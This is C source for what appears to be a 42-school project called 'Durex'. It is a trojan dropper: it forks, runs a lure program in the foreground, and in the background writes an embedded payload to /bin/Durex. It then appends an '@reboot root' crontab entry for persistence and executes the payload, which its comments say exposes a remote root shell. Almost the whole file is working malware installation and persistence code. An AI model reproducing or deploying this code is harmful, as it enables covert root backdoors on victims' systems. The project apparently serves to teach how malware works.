/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/11/15 19:18:57 by bccyv             #+#    #+#             */
/*   Updated: 2021/11/15 19:48:27 by bccyv            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <durex.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern int stub[];
extern size_t stub_len;

int write_binary(void *bin, size_t blen, const char *bpath)
{
	int fd;

	fd = open(bpath, O_WRONLY | O_CREAT, S_IRWXU);
	if (fd < 0)
		return (-1);

	write(fd, (char *)bin, blen);
	close(fd);

	return (0);
}

int add_crontab_entry(const char *cpath, const char *bpath)
{
	int fd;
	char *cmd;

	fd = open(cpath, O_RDWR | O_APPEND);
	if (fd < 0)
		return (-1);

	if (!ft_strnf(fd, bpath))
	{
		cmd = ft_strcat("@reboot root ", bpath);
		if (cmd == NULL)
		{
			close(fd);
			return (-1);
		}

		dprintf(fd, "%s\n", cmd);
	}

	close(fd);
	return (0);
}

/*
 * This programm will start whatever legit software in the foreground (lure.c)
 * and a malicious code in the background. This malicious code will add
 * a binary in system binaries, and execute it as a daemon at each reboot.
 * This binary will expose a remote root shell.
*/
int main(void)
{
	int pid;

	pid = fork();
	if (pid > 0)
	{
		// Legit code
		lure();
	}
	else
	{
		/*
		 * Malicious code:
		 * 1. writes the payload (stub.c) in system binaries
		 * 2. adds a crontab entry to execute it at boot time
		 * 3. executes it manually a first time
		*/

		if (write_binary(stub, stub_len, "/bin/Durex") < 0)
		{
			perror("Durex");
			exit(EXIT_FAILURE);
		}

		if (add_crontab_entry("/etc/crontab", "/bin/Durex") < 0)
		{
			perror("Durex");
			exit(EXIT_FAILURE);
		}

		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
	}
	return (0);
}
